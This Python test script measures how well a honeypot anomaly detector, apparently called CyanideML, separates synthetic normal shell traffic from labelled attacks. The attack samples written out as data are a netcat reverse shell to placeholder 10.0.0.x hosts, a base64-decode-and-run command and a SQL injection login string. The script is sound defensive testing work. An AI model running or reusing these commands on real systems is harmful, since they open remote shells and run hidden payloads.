import random
import sys
import os
import string
import time

# Add project root
# Add project root/src to path
sys.path.append(os.path.abspath(os.path.join(os.getcwd(), 'src')))



def random_str(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_normal_traffic(n=1000):
    """Generates standard, repetitive botnet/user traffic."""
    logs = []
    # Profile 1: The "Mirai-like" bot (Very common)
    for _ in range(int(n * 0.7)):
        logs.append({
            "command": random.choice(["enable", "shell", "sh", "/bin/busybox PS", "cat /proc/mounts"]),
            "username": random.choice(["root", "admin", "guest"]),
            "password": random.choice(["123456", "password", "root"]),
            "dst_port": 23,
            "protocol": "telnet",
            "label": "normal"
        })
    
    # Profile 2: The "Admin" (Common commands)
    for _ in range(int(n * 0.3)):
        logs.append({
            "command": random.choice(["ls -la", "pwd", "id", "uname -a", "whoami"]),
            "username": "root",
            "password": "correct_password",
            "dst_port": 2222,
            "protocol": "ssh",
            "label": "normal"
        })
    return logs

def generate_subtle_anomalies(n=100):
    """Generates tricky, non-obvious attacks."""
    logs = []
    
    # Attack 1: SQL Injection in Auth (Should be anomalous due to special chars)
    for _ in range(int(n * 0.2)):
        payload = f"admin' OR 1=1; -- {random_str(5)}"
        logs.append({
            "command": "",
            "username": payload,
            "password": "123", 
            "dst_port": 2222, 
            "label": "anomaly"
        })

    # Attack 2: Obfuscated/Long Commands (Entropy anomaly)
    for _ in range(int(n * 0.3)):
        # Base64-like string
        b64 = "".join(random.choices(string.ascii_letters + string.digits + "+/=", k=150))
        logs.append({
            "command": f"echo {b64} | base64 -d | sh",
            "username": "root",
            "dst_port": 2222, 
            "label": "anomaly"
        })
        
    # Attack 3: Rare/Weird Ports
    for _ in range(int(n * 0.2)):
        logs.append({
            "command": "id",
            "username": "root",
            "dst_port": 9999, # Highly unusual port
            "label": "anomaly"
        })
        
    # Attack 4: Reverse Shells (Distinctive patterns)
    for _ in range(int(n * 0.3)):
        ip = f"10.0.0.{random.randint(1,255)}"
        logs.append({
            "command": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 1234 >/tmp/f",
            "username": "www-data",
            "dst_port": 80, 
            "label": "anomaly"
        })

    return logs

def run_test():
    print("[*] Generating Advanced Test Dataset...")
    
    train_data = generate_normal_traffic(n=3000)
    
    # Load Existing Model
    # Load Existing Model
    try:
        from cyanide.ml import CyanideML
        model_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../ai_models/cyanideML"))
        print(f"[*] Loading CyanideML from {model_dir}...")
        model = CyanideML(model_dir)
    except Exception as e:
        print(f"[!] Failed to load model: {e}")
        return

    # 2. Testing Phase
    test_normal = generate_normal_traffic(n=500)
    test_anomalies = generate_subtle_anomalies(n=200)
    
    test_set = test_normal + test_anomalies
    random.shuffle(test_set)
    
    print(f"[*] Testing on {len(test_set)} logs ({len(test_normal)} normal, {len(test_anomalies)} anomalies)...")
    
    tp = 0 # Anomaly detected correctly
    tn = 0 # Normal traffic ignored correctly
    fp = 0 # Normal traffic flagged as anomaly (False Alarm)
    fn = 0 # Anomaly missed (False Negative)
    
    for log in test_set:
        cmd = log.get("command") or log.get("username") # Some attacks present in username
        is_val_anomaly = (log['label'] == 'anomaly')
        
        result = model.analyze_command(str(cmd))
        is_pred_anomaly = result['is_anomaly']
        score = result['anomaly_score']
        
        if is_val_anomaly:
            if is_pred_anomaly:
                tp += 1
            else:
                fn += 1
                # Debug failures
                if fn <= 5:
                    print(f"  [MISS] {cmd} (Score: {score:.4f})")
        else:
            if is_pred_anomaly:
                fp += 1
                if fp <= 5:
                    print(f"  [FALSE ALARM] {cmd} (Score: {score:.4f})")
            else:
                tn += 1


    print("\n" + "="*40)
    print("      ADVANCED VALIDATION RESULTS      ")
    print("="*40)
    print(f"Total Samples: {len(test_set)}")
    print(f"True Positives (Threats Caught): {tp}")
    print(f"True Negatives (Normal Ignored): {tn}")
    print(f"False Positives (False Alarms):  {fp}")
    print(f"False Negatives (Threats Missed): {fn}")
    print("-" * 40)
    
    accuracy = (tp + tn) / len(test_set)
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1 = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    
    print(f"Accuracy:  {accuracy*100:.2f}%")
    print(f"Precision: {precision*100:.2f}%  (How trustworthy are alerts?)")
    print(f"Recall:    {recall*100:.2f}%  (How many attacks did we catch?)")
    print(f"F1 Score:  {f1:.4f}")
    print("="*40)

if __name__ == "__main__":
    run_test()
